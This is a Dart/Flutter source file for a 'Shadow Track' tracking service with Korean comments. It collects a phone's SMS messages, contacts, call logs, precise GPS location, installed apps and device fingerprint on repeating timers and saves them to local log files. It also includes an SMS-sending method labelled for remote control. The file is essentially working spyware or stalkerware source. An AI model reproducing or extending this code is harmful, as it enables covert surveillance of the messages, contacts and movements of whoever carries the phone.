import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/services.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';

class TrackingService {
  static const MethodChannel _channel = MethodChannel('shadow_track');

  static Timer? _locationTimer;
  static Timer? _dataCollectionTimer;
  static Timer? _smsCollectionTimer;
  static Timer? _contactsCollectionTimer;
  static bool _isTracking = false;

  // 수집 간격 설정 (분 단위)
  static const int locationInterval = 5;  // 5분마다 위치 수집
  static const int dataInterval = 10;     // 10분마다 일반 데이터 수집
  static const int smsInterval = 3;       // 3분마다 SMS 수집
  static const int contactsInterval = 30; // 30분마다 연락처 수집

  // 초기화
  static Future<void> initialize() async {
    try {
      await _channel.invokeMethod('initialize');
      await _createLogDirectories();
      await _logSystemInfo();
      await _logEvent('SYSTEM_INITIALIZED', 'Shadow Track initialized successfully');
    } catch (e) {
      print('초기화 오류: $e');
    }
  }

  // 추적 시작
  static Future<void> startTracking() async {
    if (_isTracking) return;

    _isTracking = true;

    // 위치 추적 시작
    _startLocationTracking();

    // 일반 데이터 수집 시작
    _startDataCollection();

    // SMS 수집 시작
    _startSMSCollection();

    // 연락처 수집 시작
    _startContactsCollection();

    await _logEvent('TRACKING_STARTED', 'All monitoring services activated');
  }

  // 추적 중지
  static Future<void> stopTracking() async {
    if (!_isTracking) return;

    _isTracking = false;

    // 모든 타이머 중지
    _locationTimer?.cancel();
    _dataCollectionTimer?.cancel();
    _smsCollectionTimer?.cancel();
    _contactsCollectionTimer?.cancel();

    await _logEvent('TRACKING_STOPPED', 'All monitoring services deactivated');
  }

  // 위치 추적 시작
  static void _startLocationTracking() {
    _locationTimer = Timer.periodic(Duration(minutes: locationInterval), (timer) async {
      try {
        if (await Permission.location.isGranted) {
          final position = await Geolocator.getCurrentPosition(
            desiredAccuracy: LocationAccuracy.high,
          );
          await _logLocation(position);
        }
      } catch (e) {
        print('위치 수집 오류: $e');
        await _logEvent('LOCATION_ERROR', 'Failed to collect location: $e');
      }
    });
  }

  // 일반 데이터 수집 시작
  static void _startDataCollection() {
    _dataCollectionTimer = Timer.periodic(Duration(minutes: dataInterval), (timer) async {
      try {
        await _collectDeviceInfo();
        await _collectInstalledApps();
        await _collectNetworkInfo();
        await _collectCallLog();
        await _collectAdvancedDeviceInfo();
      } catch (e) {
        print('데이터 수집 오류: $e');
        await _logEvent('DATA_COLLECTION_ERROR', 'Failed to collect data: $e');
      }
    });
  }

  // SMS 수집 시작
  static void _startSMSCollection() {
    _smsCollectionTimer = Timer.periodic(Duration(minutes: smsInterval), (timer) async {
      try {
        if (await Permission.sms.isGranted) {
          await _collectSMSMessages();
        }
      } catch (e) {
        print('SMS 수집 오류: $e');
        await _logEvent('SMS_COLLECTION_ERROR', 'Failed to collect SMS: $e');
      }
    });
  }

  // 연락처 수집 시작
  static void _startContactsCollection() {
    _contactsCollectionTimer = Timer.periodic(Duration(minutes: contactsInterval), (timer) async {
      try {
        if (await Permission.contacts.isGranted) {
          await _collectContacts();
        }
      } catch (e) {
        print('연락처 수집 오류: $e');
        await _logEvent('CONTACTS_COLLECTION_ERROR', 'Failed to collect contacts: $e');
      }
    });
  }

  // SMS 메시지 수집
  static Future<void> _collectSMSMessages() async {
    try {
      final smsMessages = await _channel.invokeMethod('readSMS');

      if (smsMessages != null && smsMessages is List) {
        final smsData = {
          'messages': smsMessages,
          'count': smsMessages.length,
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _saveToFile('sms_messages.json', jsonEncode(smsData));
        await _logEvent('SMS_COLLECTED', 'Collected ${smsMessages.length} SMS messages');

        // 각 메시지를 개별 로그로 저장
        for (var message in smsMessages) {
          await _appendToFile('sms_log.json', jsonEncode(message));
        }
      }
    } catch (e) {
      print('SMS 수집 실패: $e');
      await _logEvent('SMS_COLLECTION_FAILED', 'Error: $e');
    }
  }

  // 연락처 수집
  static Future<void> _collectContacts() async {
    try {
      final contacts = await _channel.invokeMethod('getContacts');

      if (contacts != null && contacts is List) {
        final contactsData = {
          'contacts': contacts,
          'count': contacts.length,
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _saveToFile('contacts.json', jsonEncode(contactsData));
        await _logEvent('CONTACTS_COLLECTED', 'Collected ${contacts.length} contacts');
      }
    } catch (e) {
      print('연락처 수집 실패: $e');
      await _logEvent('CONTACTS_COLLECTION_FAILED', 'Error: $e');
    }
  }

  // 통화 기록 수집
  static Future<void> _collectCallLog() async {
    try {
      final callLog = await _channel.invokeMethod('getCallLog');

      if (callLog != null && callLog is List) {
        final callLogData = {
          'call_logs': callLog,
          'count': callLog.length,
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _saveToFile('call_log.json', jsonEncode(callLogData));
        await _logEvent('CALL_LOG_COLLECTED', 'Collected ${callLog.length} call records');

        // 각 통화 기록을 개별 로그로 저장
        for (var call in callLog) {
          await _appendToFile('call_log_detailed.json', jsonEncode(call));
        }
      }
    } catch (e) {
      print('통화 기록 수집 실패: $e');
      await _logEvent('CALL_LOG_COLLECTION_FAILED', 'Error: $e');
    }
  }

  // 고급 디바이스 정보 수집
  static Future<void> _collectAdvancedDeviceInfo() async {
    try {
      final deviceInfo = await _channel.invokeMethod('getDeviceInfo');

      if (deviceInfo != null) {
        final advancedInfo = {
          'device_details': deviceInfo,
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _appendToFile('advanced_device_info.json', jsonEncode(advancedInfo));
      }
    } catch (e) {
      print('고급 디바이스 정보 수집 실패: $e');
    }
  }

  // SMS 전송 (원격 제어용)
  static Future<bool> sendSMS(String phoneNumber, String message) async {
    try {
      final result = await _channel.invokeMethod('sendSMS', {
        'phoneNumber': phoneNumber,
        'message': message,
      });

      await _logEvent('SMS_SENT', 'SMS sent to $phoneNumber: $message');
      return result == true;
    } catch (e) {
      print('SMS 전송 실패: $e');
      await _logEvent('SMS_SEND_FAILED', 'Failed to send SMS to $phoneNumber: $e');
      return false;
    }
  }

  // 로그 디렉토리 생성
  static Future<void> _createLogDirectories() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logDir = Directory('${directory.path}/logs');
      if (!await logDir.exists()) {
        await logDir.create(recursive: true);
      }

      final dataDir = Directory('${directory.path}/collected_data');
      if (!await dataDir.exists()) {
        await dataDir.create(recursive: true);
      }

      final smsDir = Directory('${directory.path}/sms_data');
      if (!await smsDir.exists()) {
        await smsDir.create(recursive: true);
      }

      final contactsDir = Directory('${directory.path}/contacts_data');
      if (!await contactsDir.exists()) {
        await contactsDir.create(recursive: true);
      }
    } catch (e) {
      print('디렉토리 생성 오류: $e');
    }
  }

  // 시스템 정보 로그
  static Future<void> _logSystemInfo() async {
    try {
      final deviceInfo = DeviceInfoPlugin();
      final packageInfo = await PackageInfo.fromPlatform();

      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;

        final systemInfo = {
          'device_id': androidInfo.id,
          'model': androidInfo.model,
          'brand': androidInfo.brand,
          'manufacturer': androidInfo.manufacturer,
          'android_version': androidInfo.version.release,
          'sdk_version': androidInfo.version.sdkInt,
          'app_version': packageInfo.version,
          'app_build': packageInfo.buildNumber,
          'fingerprint': androidInfo.fingerprint,
          'hardware': androidInfo.hardware,
          'host': androidInfo.host,
          'product': androidInfo.product,
          'tags': androidInfo.tags,
          'type': androidInfo.type,
          'is_physical_device': androidInfo.isPhysicalDevice,
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _saveToFile('system_info.json', jsonEncode(systemInfo));
      }
    } catch (e) {
      print('시스템 정보 로그 오류: $e');
    }
  }

  // 위치 로그
  static Future<void> _logLocation(Position position) async {
    try {
      final locationData = {
        'latitude': position.latitude,
        'longitude': position.longitude,
        'accuracy': position.accuracy,
        'altitude': position.altitude,
        'heading': position.heading,
        'speed': position.speed,
        'speed_accuracy': position.speedAccuracy,
        'altitude_accuracy': position.altitudeAccuracy,
        'heading_accuracy': position.headingAccuracy,
        'timestamp': DateTime.now().toIso8601String(),
        'position_timestamp': position.timestamp.toIso8601String(),
      };

      await _appendToFile('location_log.json', jsonEncode(locationData));
      print('위치 저장됨: ${position.latitude}, ${position.longitude}');
    } catch (e) {
      print('위치 로그 오류: $e');
    }
  }

  // 디바이스 정보 수집
  static Future<void> _collectDeviceInfo() async {
    try {
      final deviceInfo = {
        'battery_level': await _getBatteryLevel(),
        'available_storage': await _getAvailableStorage(),
        'network_type': await _getNetworkType(),
        'memory_info': await _getMemoryInfo(),
        'timestamp': DateTime.now().toIso8601String(),
      };

      await _appendToFile('device_status.json', jsonEncode(deviceInfo));
    } catch (e) {
      print('디바이스 정보 수집 오류: $e');
    }
  }

  // 설치된 앱 정보 수집
  static Future<void> _collectInstalledApps() async {
    try {
      final apps = await _channel.invokeMethod('getInstalledApps');

      if (apps != null) {
        final appData = {
          'installed_apps': apps,
          'app_count': apps is List ? apps.length : 0,
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _saveToFile('installed_apps.json', jsonEncode(appData));
      }
    } catch (e) {
      print('앱 정보 수집 오류: $e');
    }
  }

  // 네트워크 정보 수집
  static Future<void> _collectNetworkInfo() async {
    try {
      final networkType = await _getNetworkType();
      final networkInfo = {
        'network_type': networkType,
        'is_connected': networkType != 'Unknown',
        'timestamp': DateTime.now().toIso8601String(),
      };

      await _appendToFile('network_log.json', jsonEncode(networkInfo));
    } catch (e) {
      print('네트워크 정보 수집 오류: $e');
    }
  }

  // 메모리 정보 가져오기
  static Future<Map<String, dynamic>> _getMemoryInfo() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final totalSpace = await directory.stat();

      return {
        'total_space': totalSpace.size,
        'available_space': 'Unknown', // 추후 구현
        'used_space': 'Unknown',
      };
    } catch (e) {
      return {'error': e.toString()};
    }
  }

  // 배터리 레벨 가져오기
  static Future<int> _getBatteryLevel() async {
    try {
      return await _channel.invokeMethod('getBatteryLevel');
    } catch (e) {
      return -1;
    }
  }

  // 사용 가능한 저장 공간 가져오기
  static Future<String> _getAvailableStorage() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final stat = await directory.stat();
      return '${(stat.size / (1024 * 1024)).toStringAsFixed(2)} MB';
    } catch (e) {
      return 'Unknown';
    }
  }

  // 네트워크 타입 가져오기
  static Future<String> _getNetworkType() async {
    try {
      return await _channel.invokeMethod('getNetworkType');
    } catch (e) {
      return 'Unknown';
    }
  }

  // 이벤트 로그
  static Future<void> _logEvent(String event, String details) async {
    try {
      final eventData = {
        'event': event,
        'details': details,
        'timestamp': DateTime.now().toIso8601String(),
        'session_id': await _getSessionId(),
      };

      await _appendToFile('event_log.json', jsonEncode(eventData));
    } catch (e) {
      print('이벤트 로그 오류: $e');
    }
  }

  // 세션 ID 생성/가져오기
  static Future<String> _getSessionId() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      String? sessionId = prefs.getString('session_id');

      if (sessionId == null) {
        sessionId = DateTime.now().millisecondsSinceEpoch.toString();
        await prefs.setString('session_id', sessionId);
      }

      return sessionId;
    } catch (e) {
      return 'unknown_session';
    }
  }

  // 파일 저장 (덮어쓰기)
  static Future<void> _saveToFile(String filename, String content) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/collected_data/$filename');
      await file.writeAsString(content);
    } catch (e) {
      print('파일 저장 오류: $e');
    }
  }

  // 파일에 추가 (append)
  static Future<void> _appendToFile(String filename, String content) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/logs/$filename');
      await file.writeAsString('$content\n', mode: FileMode.append);
    } catch (e) {
      print('파일 추가 오류: $e');
    }
  }

  // 수집된 데이터 통계
  static Future<Map<String, dynamic>> getCollectionStats() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');
      final dataDir = Directory('${directory.path}/collected_data');

      final stats = {
        'total_log_files': 0,
        'total_data_files': 0,
        'sms_count': 0,
        'contacts_count': 0,
        'call_log_count': 0,
        'location_count': 0,
        'event_count': 0,
        'last_update': DateTime.now().toIso8601String(),
      };

      // 로그 파일 수 계산
      if (await logsDir.exists()) {
        final logFiles = await logsDir.list().toList();
        stats['total_log_files'] = logFiles.length;

        // 각 파일별 라인 수 계산
        for (final file in logFiles) {
          if (file is File) {
            try {
              final content = await file.readAsString();
              final lines = content.split('\n').where((line) => line.trim().isNotEmpty).length;

              final fileName = file.path.split('/').last;
              if (fileName.contains('sms')) {
                stats['sms_count'] = (stats['sms_count'] as int) + lines;
              } else if (fileName.contains('location')) {
                stats['location_count'] = (stats['location_count'] as int) + lines;
              } else if (fileName.contains('event')) {
                stats['event_count'] = (stats['event_count'] as int) + lines;
              } else if (fileName.contains('call')) {
                stats['call_log_count'] = (stats['call_log_count'] as int) + lines;
              }
            } catch (e) {
              // 파일 읽기 오류 무시
            }
          }
        }
      }

      // 데이터 파일 수 계산
      if (await dataDir.exists()) {
        final dataFiles = await dataDir.list().toList();
        stats['total_data_files'] = dataFiles.length;
      }

      return stats;
    } catch (e) {
      return {'error': e.toString()};
    }
  }

  // 수집된 데이터 가져오기 (기존 메서드 유지)
  static Future<List<Map<String, dynamic>>> getCollectedData() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');

      if (!await logsDir.exists()) {
        return [];
      }

      final files = await logsDir.list().toList();
      final List<Map<String, dynamic>> allData = [];

      for (final file in files) {
        if (file is File && file.path.endsWith('.json')) {
          try {
            final content = await file.readAsString();
            final lines = content.split('\n').where((line) => line.trim().isNotEmpty);

            for (final line in lines) {
              try {
                final data = jsonDecode(line);
                data['source_file'] = file.path.split('/').last;
                allData.add(data);
              } catch (e) {
                // JSON 파싱 오류 무시
              }
            }
          } catch (e) {
            print('파일 읽기 오류: ${file.path} - $e');
          }
        }
      }

      // 타임스탬프 기준으로 정렬
      allData.sort((a, b) {
        final timeA = DateTime.tryParse(a['timestamp'] ?? '') ?? DateTime.now();
        final timeB = DateTime.tryParse(b['timestamp'] ?? '') ?? DateTime.now();
        return timeB.compareTo(timeA);
      });

      return allData;
    } catch (e) {
      print('데이터 가져오기 오류: $e');
      return [];
    }
  }

  // 특정 타입의 데이터만 가져오기
  static Future<List<Map<String, dynamic>>> getDataByType(String type) async {
    try {
      final allData = await getCollectedData();
      return allData.where((data) {
        final sourceFile = data['source_file'] as String? ?? '';
        return sourceFile.toLowerCase().contains(type.toLowerCase());
      }).toList();
    } catch (e) {
      return [];
    }
  }

  // SMS 데이터만 가져오기
  static Future<List<Map<String, dynamic>>> getSMSData() async {
    return await getDataByType('sms');
  }

  // 연락처 데이터만 가져오기
  static Future<List<Map<String, dynamic>>> getContactsData() async {
    return await getDataByType('contacts');
  }

  // 통화 기록만 가져오기
  static Future<List<Map<String, dynamic>>> getCallLogData() async {
    return await getDataByType('call');
  }

  // 위치 데이터만 가져오기
  static Future<List<Map<String, dynamic>>> getLocationData() async {
    return await getDataByType('location');
  }

  // 데이터 초기화
  static Future<void> clearAllData() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');
      final dataDir = Directory('${directory.path}/collected_data');

      if (await logsDir.exists()) {
        await logsDir.delete(recursive: true);
      }
      if (await dataDir.exists()) {
        await dataDir.delete(recursive: true);
      }

      await _createLogDirectories();
      await _logEvent('DATA_CLEARED', 'All collected data has been cleared');
    } catch (e) {
      print('데이터 초기화 오류: $e');
    }
  }

  // 추적 상태 확인
  static bool get isTracking => _isTracking;

  // 수집 간격 정보
  static Map<String, int> get collectionIntervals => {
    'location': locationInterval,
    'data': dataInterval,
    'sms': smsInterval,
    'contacts': contactsInterval,
  };
}